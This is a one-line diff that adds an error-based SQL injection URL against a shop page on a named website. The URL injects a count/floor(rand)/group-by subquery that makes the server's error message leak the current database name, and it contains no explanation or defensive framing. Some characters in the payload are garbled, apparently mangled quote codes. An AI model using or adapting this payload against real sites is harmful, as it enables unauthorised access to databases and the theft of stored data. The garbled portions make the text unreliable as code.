@@ -1,0 +1,1 @@
+http://sb.f4ck.net/shop.php?ac=view&shopid=4 and (select 1 from(select count(*),concat((select (select concat(0x7e,0¡Á27,unhex(hex(database())),0¡Á27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
